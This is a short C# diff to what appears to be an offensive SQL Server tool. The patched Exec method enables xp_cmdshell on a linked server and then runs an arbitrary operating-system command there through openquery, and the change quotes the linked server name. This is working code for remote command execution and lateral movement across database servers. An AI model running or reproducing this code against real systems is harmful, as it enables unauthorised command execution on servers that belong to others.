@@ -12,8 +12,8 @@ namespace SQL
     {
         public static void Exec(String target, SqlConnection con, String cmd)
         {
-            String enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT " + target;
-            String execCmd = "select * from openquery(" + target + ",'EXEC xp_cmdshell ''" + cmd + "'' WITH RESULT SETS ((output VARCHAR(MAX)))')";
+            String enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT \"" + target +"\"";
+            String execCmd = "select * from openquery(\"" + target + "\",'EXEC xp_cmdshell ''" + cmd + "'' WITH RESULT SETS ((output VARCHAR(MAX)))')";
 
             SqlCommand command = new SqlCommand(enable_xpcmd, con);
             SqlDataReader reader = command.ExecuteReader();
